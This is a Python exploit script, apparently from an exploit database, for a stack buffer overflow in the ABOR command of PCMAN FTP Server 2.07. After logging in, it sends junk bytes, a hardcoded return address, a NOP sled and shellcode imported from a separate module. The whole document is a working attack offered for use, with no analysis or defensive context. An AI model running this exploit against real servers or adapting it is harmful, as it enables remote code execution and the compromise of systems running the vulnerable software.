# Exploit Title: PCMAN FTP 2.07 ABOR Command Buffer Overflow
# Date: Jan 25,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 2.07
# Tested on: Windows 7 sp1 x64 (english)
# Email: m.dofo123@gmail.com
import socket as s
from sys import argv
from socket import *
import socket
import struct
from struct import pack
from payload import buf
import time
def shell_attack(target_machine, target_port):

    
        fuser = b"User"
        fpass = b"Pass"
        #vars
        junk = b'\x41' * 2011 #overwrite function (ABOR) with garbage/junk chars
        espaddress = b'\x59\x06\xbb\x76' # 76BB0659
        nops = b'\x90' * 10
       
        sploit = junk+espaddress+nops+buf
        #create socket
        conn = s.socket(s.AF_INET,s.SOCK_STREAM)
        #establish connection to server
        conn.connect((target_machine,target_port))
        #post ftp user
        conn.send(b'USER '+fuser+b'\r\n')
        #wait for response
        uf = conn.recv(1024)
        #post ftp password
        conn.send(b'PASS '+fpass+b'\r\n')
        #wait for response
        pf = conn.recv(1024)
        #send ftp command with sploit
        conn.send(b'ABOR '+sploit+b'\r\n')
        cf = conn.recv(1024)
        #close connection
        conn.close()
        
        
        